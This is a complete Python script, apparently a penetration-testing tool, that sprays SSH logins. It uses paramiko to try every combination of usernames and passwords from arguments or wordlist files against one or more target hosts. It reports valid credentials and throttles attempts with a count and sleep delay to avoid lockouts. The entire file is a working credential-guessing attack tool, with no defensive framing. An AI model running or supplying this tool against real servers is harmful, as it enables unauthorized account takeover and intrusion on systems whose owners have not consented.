''' SSH credential sprayer '''
import argparse
from socket import timeout
from time import sleep
import paramiko

def main():
    ''' main '''
    parser=argparse.ArgumentParser(description="SSH credential sprayer")
    group1=parser.add_mutually_exclusive_group(required=True)
    group1.add_argument("-t", metavar="target", help="target IP address")
    group1.add_argument("-T", metavar="targetfile", help="file of targets")
    group2=parser.add_mutually_exclusive_group(required=True)
    group2.add_argument("-u", metavar="username", help="username")
    group2.add_argument("-U", metavar="userfile", help="file of usernames")
    group3=parser.add_mutually_exclusive_group(required=True)
    group3.add_argument("-p", metavar="password", help="password")
    group3.add_argument("-P", metavar="passfile", help="file of passwords")
    parser.add_argument("-c", metavar="count", help="# attempts before sleep", type=int, default=-1)
    parser.add_argument("-s", metavar="sleep", help="seconds between attempts", type=int, default=0)
    parser.add_argument("--port", help="port to attack", default=22)
    args=parser.parse_args()

    if args.t:
        targets=[args.t]
    else:
        with open(args.T, "r", encoding="utf-8") as file:
            targets=file.read().split()

    if args.u:
        usernames=[args.u]
    else:
        with open(args.U, "r", encoding="utf-8") as file:
            usernames=file.read().split()

    if args.p:
        passwords=[args.p]
    else:
        with open(args.P, "r", encoding="utf-8") as file:
            passwords=file.read().split()

    count=args.c
    delay=args.s
    port=args.port
    connect_count=0

    ssh=paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for target in targets:
        print(f"Attacking {target}")
        for username in usernames:
            for password in passwords:
                print(f"\tUsername: {username:<15}\tPassword: {password:<15}", end="", flush=True)
                try:
                    ssh.connect(target, port, username, password, look_for_keys=False, timeout=5)
                    print("\tValid credentials!")
                except paramiko.ssh_exception.BadAuthenticationType:
                    print("\tBad authentication type")
                except timeout:
                    print("\tTimed out")
                except paramiko.ssh_exception.AuthenticationException:
                    print("\tBad credentials")
                finally:
                    ssh.close()
                    # check # attempts, sleep if necessary
                    connect_count+=1
                    if connect_count%count==0:
                        print("Sleeping...")
                        sleep(delay)

    print("Done!")

if __name__=="__main__":
    main()
